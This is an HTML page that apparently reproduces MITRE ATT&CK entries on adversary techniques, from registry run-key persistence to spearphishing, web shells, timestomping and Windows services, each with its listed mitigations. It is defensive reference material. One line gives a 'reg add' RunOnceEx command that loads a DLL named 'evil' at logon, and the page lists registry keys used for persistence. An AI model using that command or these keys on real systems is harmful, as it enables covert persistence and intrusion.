                            <p><span style="padding-left: 40px; display:block">Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</span></p>
                            <p><span style="padding-left: 80px; display:block">Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">Limit Software Installation - Block users or groups from installing unapproved software.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following run keys are created by default on Windows systems:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> 

The following Registry keys can be used to set startup folder items for persistence:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use <a href="https://attack.mitre.org/techniques/T1036">Masquerading</a> to make the Registry entries look as if they are associated with legitimate programs.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Remote Access Software</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. 

Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.

Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.  </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Remote Services: Remote Desktop Protocol</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may use <a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a> to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). 

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the <a href="https://attack.mitre.org/techniques/T1546/008">Accessibility Features</a> technique for Persistence.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</span></p>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Limit Access to Resource Over Network - Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.</span></p>
                            <p><span style="padding-left: 80px; display:block">Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</span></p>
                            <p><span style="padding-left: 80px; display:block">Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</span></p>
                            <p><span style="padding-left: 80px; display:block">Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Search Open Websites/Domains: Social Media</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.

Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. <a href="https://attack.mitre.org/techniques/T1598/001">Spearphishing Service</a>). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: <a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a> or <a href="https://attack.mitre.org/techniques/T1596">Search Open Technical Databases</a>), establishing operational resources (ex: <a href="https://attack.mitre.org/techniques/T1585">Establish Accounts</a> or <a href="https://attack.mitre.org/techniques/T1586">Compromise Accounts</a>), and/or initial access (ex: <a href="https://attack.mitre.org/techniques/T1566/003">Spearphishing via Service</a>).</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Obfuscated Files or Information: Software Packing</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. 

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Phishing: Spearphishing Attachment</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon <a href="https://attack.mitre.org/techniques/T1204">User Execution</a> to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</span></p>
                            <p><span style="padding-left: 80px; display:block">Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</span></p>
                            <p><span style="padding-left: 80px; display:block">Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Phishing: Spearphishing Link</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging <a href="https://attack.mitre.org/techniques/T1204">User Execution</a>. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to <a href="https://attack.mitre.org/techniques/T1528">Steal Application Access Token</a>s, like OAuth tokens, in order to gain access to protected applications and information.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</span></p>
                            <p><span style="padding-left: 80px; display:block">Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Phishing for Information: Spearphishing Link</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: <a href="https://attack.mitre.org/techniques/T1585">Establish Accounts</a> or <a href="https://attack.mitre.org/techniques/T1586">Compromise Accounts</a>) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex: <a href="https://attack.mitre.org/techniques/T1593">Search Open Websites/Domains</a> or <a href="https://attack.mitre.org/techniques/T1594">Search Victim-Owned Websites</a>) to craft persuasive and believable lures.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Software Configuration - Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">System Information Discovery</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from <a href="https://attack.mitre.org/techniques/T1082">System Information Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Tools such as <a href="https://attack.mitre.org/software/S0096">Systeminfo</a> can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. <a href="https://attack.mitre.org/techniques/T1082">System Information Discovery</a> combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.

Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Indicator Removal on Host: Timestomp</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.

Timestomping may be used along with file name <a href="https://attack.mitre.org/techniques/T1036">Masquerading</a> to hide malware and tools.</span></p></details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Obtain Capabilities: Tool</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: <a href="https://attack.mitre.org/software/S0029">PsExec</a>). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as <a href="https://attack.mitre.org/software/S0154">Cobalt Strike</a>. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.

Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Command and Scripting Interpreter: Visual Basic</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as <a href="https://attack.mitre.org/techniques/T1559/001">Component Object Model</a> and the <a href="https://attack.mitre.org/techniques/T1106">Native API</a> through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.

Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of <a href="https://attack.mitre.org/techniques/T1059/007">JavaScript</a> on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).

Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into <a href="https://attack.mitre.org/techniques/T1566/001">Spearphishing Attachment</a> payloads.</span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</span></p>
                            <p><span style="padding-left: 80px; display:block">Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</span></p>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</span></p>
                            <p><span style="padding-left: 80px; display:block">Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Server Software Component: Web Shell</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: <a href="https://attack.mitre.org/software/S0020">China Chopper</a> Web shell client). </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</span></p></details>
                        </details>
                        <details>
                            <summary class="u-align-left u-text u-text-custom-color-1 u-text-9"><h5 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 20px; display:block">Create or Modify System Process: Windows Service</span></h5></summary>
                            <p><span style="padding-left: 40px; display:block">Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and <a href="https://attack.mitre.org/software/S0075">Reg</a>. 

Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.

An adversary may also incorporate <a href="https://attack.mitre.org/techniques/T1036">Masquerading</a> by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. 

Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through <a href="https://attack.mitre.org/techniques/T1569/002">Service Execution</a>. </span></p>
                    <details>
                        <summary><h6 class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-9"><span style="padding-left: 60px; display:block">Mitigations</span></h6></summary>
                            <p><span style="padding-left: 80px; display:block">Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</span></p>
                            <p><span style="padding-left: 80px; display:block">User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</span></p></details>
                        </details>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
            
            
            <footer class="u-black u-border-3 u-border-custom-color-1 u-clearfix u-footer" id="sec-be64"><div class="u-clearfix u-sheet u-sheet-1">
                <div class="u-align-left u-social-icons u-spacing-10 u-social-icons-1">
                  <a class="u-social-url" target="_blank" data-type="Github" title="Github" href="https://github.com/redbeardmeric/APTAnalyzer"><span class="u-icon u-social-github u-social-icon u-icon-1"><svg class="u-svg-link" preserveAspectRatio="xMidYMin slice" viewBox="0 0 112 112" style=""><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#svg-2f65"></use></svg><svg class="u-svg-content" viewBox="0 0 112 112" x="0" y="0" id="svg-2f65"><circle fill="currentColor" cx="56.1" cy="56.1" r="55"></circle><path fill="#FFFFFF" d="M88,51.3c0-5.5-1.9-10.2-5.3-13.7c0.6-1.3,2.3-6.5-0.5-13.5c0,0-4.2-1.4-14,5.3c-4.1-1.1-8.4-1.7-12.7-1.8
                c-4.3,0-8.7,0.6-12.7,1.8c-9.7-6.6-14-5.3-14-5.3c-2.8,7-1,12.2-0.5,13.5C25,41.2,23,45.7,23,51.3c0,19.6,11.9,23.9,23.3,25.2
                c-1.5,1.3-2.8,3.5-3.2,6.8c-3,1.3-10.2,3.6-14.9-4.3c0,0-2.7-4.9-7.8-5.3c0,0-5-0.1-0.4,3.1c0,0,3.3,1.6,5.6,7.5c0,0,3,9.1,17.2,6
                c0,4.3,0.1,8.3,0.1,9.5h25.2c0-1.7,0.1-7.2,0.1-14c0-4.7-1.7-7.9-3.4-9.4C76,75.2,88,70.9,88,51.3z"></path></svg></span>
                  </a>
                  <a class="u-social-url" target="_blank" data-type="Github" title="MITRE Att&amp;ck" href="https://attack.mitre.org/"><span class="u-file-icon u-icon u-social-github u-social-icon u-icon-2"><img src="images/Attck.jpg" alt=""></span>
                  </a>
                </div>
              </div></footer>
            <section class="u-backlink u-clearfix u-grey-80">
              <a class="u-link" href="https://nicepage.com/templates" target="_blank">
                <span>Template</span>
              </a>
              <p class="u-text">
                <span>created with</span>
              </p>
              <a class="u-link" href="https://nicepage.com/html-website-builder" target="_blank">
                <span>HTML Website Builder</span>
              </a>. 
            </section>
          </body>
        </html>